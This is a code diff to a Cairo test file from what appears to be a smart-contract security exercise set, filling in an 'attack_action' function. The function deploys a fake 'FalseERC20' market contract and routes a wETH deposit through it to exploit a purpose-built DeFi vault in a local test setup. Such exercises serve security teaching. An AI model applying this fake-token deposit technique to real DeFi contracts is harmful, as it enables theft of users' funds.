@@ -17,9 +17,6 @@ mod TestDoubleDip {
     use pharaonik::interfaces::ISubDefiVault::{
         ISubDefiVaultSafeDispatcher, ISubDefiVaultSafeDispatcherTrait
     };
-    use pharaonik::excercises::excercise0::double_dip::attack::{
-        IAttackSafeDispatcher, IAttackSafeDispatcherTrait
-    };
     use pharaonik::utils::constants::Constants;
     use pharaonik::utils::errors::Errors;
     use pharaonik::setup::setup::Setup::{declare_contract, deploy_contract, fund_tokens};
@@ -29,7 +26,6 @@ mod TestDoubleDip {
     #[feature("safe_dispatcher")]
     fn test_exploit() {
         let (wETH_address, router_address, eth_vault_address) = setup_double_dip();
-        let wETH = IERC20CamelSafeDispatcher { contract_address: wETH_address };
         let SubDefiRouter = ISubDefiRouterSafeDispatcher { contract_address: router_address };
         let SubDefiEthVault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault_address };
         let sub_defi_admin = Constants::sub_defi_admin();
@@ -42,12 +38,13 @@ mod TestDoubleDip {
         SubDefiEthVault.update_rate(1000000000000000000).unwrap();
         stop_prank(CheatTarget::One(eth_vault_address));
 
-        attack_action(router_address, wETH_address);
+        attack_action(router_address, wETH_address, eth_vault_address);
         'Excerise Completed!'.print();
     }
 
     // Complete the below function 
-    fn attack_action(router: ContractAddress, wETH: ContractAddress) {
+    #[feature("safe_dispatcher")]
+    fn attack_action(router: ContractAddress, wETH: ContractAddress, eth_vault: ContractAddress) {
         let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
         let attacker = Constants::attacker();
         let Router = ISubDefiRouterSafeDispatcher { contract_address: router };
@@ -56,15 +53,17 @@ mod TestDoubleDip {
         // Deploy false wETH Market contract
         let mut call_data = ArrayTrait::new();
         call_data.append(contract_address_to_felt252(attacker));
+        call_data.append(contract_address_to_felt252(wETH));
+        call_data.append(contract_address_to_felt252(eth_vault));
         let false_market_class: ContractClass = declare_contract('FalseERC20');
         let false_market_address: ContractAddress = deploy_contract(false_market_class, call_data);
 
         IERC20CamelSafeDispatcher { contract_address: wETH }
-            .transfer(false_market_address, deposit_amount);
-
+            .transfer(false_market_address, deposit_amount)
+            .unwrap();
         // Deposit
         start_prank(CheatTarget::One(router), attacker);
-        let deposit_id: u8 = Router
+        let _deposit_id: u8 = Router
             .deposit_request(market_id, false_market_address, deposit_amount)
             .unwrap();
         stop_prank(CheatTarget::One(router));
